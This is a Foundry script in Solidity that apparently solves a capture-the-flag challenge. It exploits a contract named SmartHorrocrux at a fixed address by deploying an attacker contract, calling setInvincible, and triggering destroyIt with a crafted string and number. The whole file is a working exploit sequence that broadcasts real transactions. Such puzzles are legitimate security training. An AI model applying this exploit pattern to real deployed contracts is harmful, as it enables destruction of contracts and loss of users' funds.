// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SmartHorrocrux.sol";
import "../src/attackers/SmartHorrocruxAttacker.sol";

contract SmartHorrocruxTest is Script {
    SmartHorrocrux public target;
    address instanceAddress = 0x6b0cD71553295DDB63500B9F576cB09ccB790ce8;

    function setUp() public {
        target = SmartHorrocrux(payable(instanceAddress));
        vm.label(address(target), "Challenge");
    }

    function run() public {
        vm.startBroadcast();

        (bool success, ) = address(target).call("");
        new SmartHorrocruxAttacker{value: 1}(address(target));
        target.setInvincible();

        target.destroyIt(
            "EtherKadabra",
            uint256(
                1674133736526169897937118197707213605401161395219457310256203720527328533346
            )
        );

        require(!target.alive(), "Failed");

        vm.stopBroadcast();
    }
}
